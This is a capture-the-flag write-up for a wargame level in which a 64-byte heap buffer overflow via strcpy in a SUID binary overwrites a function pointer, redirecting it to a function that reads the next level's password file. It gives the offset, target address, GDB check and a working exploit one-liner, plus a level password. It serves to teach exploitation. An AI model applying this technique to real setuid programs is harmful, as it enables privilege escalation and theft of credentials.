# level6

## 1. Connect to the VM

The password for `level6`, obtained by solving `level5`, is:

```text
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

Connect with:

```bash
ssh level6@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level7` and has the SUID bit set. It therefore runs
with `level7` privileges.

Two functions are defined:

```c
int n(void)
{
	return system("/bin/cat /home/user/level7/.pass");
}

int m(void)
{
	return puts("Nope");
}
```

`main` allocates a 64-byte heap buffer `buf` and a 4-byte block that holds a
function pointer `fp`, initialised to `m`. The user-supplied argument is then
copied into `buf` with `strcpy`, and `(*fp)()` is called.

```c
buf = malloc(0x40);   /* 64 bytes */
fp  = malloc(4);
*fp = m;
strcpy(buf, argv[1]);
return (*fp)();
```

Because `strcpy` performs no bounds check, an argument longer than 64 bytes
overflows into the adjacent heap block and overwrites `fp`. The goal is to
replace `fp` with the address of `n`.

## 3. Disassemble / Analyse the binary

Disassemble the binary to find the address of `n`:

```bash
objdump -d -M intel level6
```

The function starts at:

```text
n address = 0x08048454
```

On a little-endian x86 machine this address is represented as:

```text
\x54\x84\x04\x08
```

## 4. Find the offset

The heap layout after both `malloc` calls is:

```
+--------+------------------------+--------+------+
|  hdr   |    buf (64 bytes)      |  hdr   |  fp  |
+--------+------------------------+--------+------+
  8 bytes         64 bytes          8 bytes  4 bytes
```

The glibc allocator prepends an 8-byte chunk header to each block. To reach
`fp`, the overflow must cross the 64 bytes of `buf` and those 8 header bytes,
giving an offset of 72.

Confirm in GDB:

```gdb
run "$(python -c 'print "A"*72 + "BBBB"')"
```

After `(*fp)()` is called:

```text
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

`0x42` is the ASCII code of `B`, confirming that `fp` is fully overwritten
starting at byte 72.

## 5. Exploit the binary

Replace the 4 bytes at offset 72 with the address of `n`:

```bash
./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
```

This prints the password stored in `flag`.
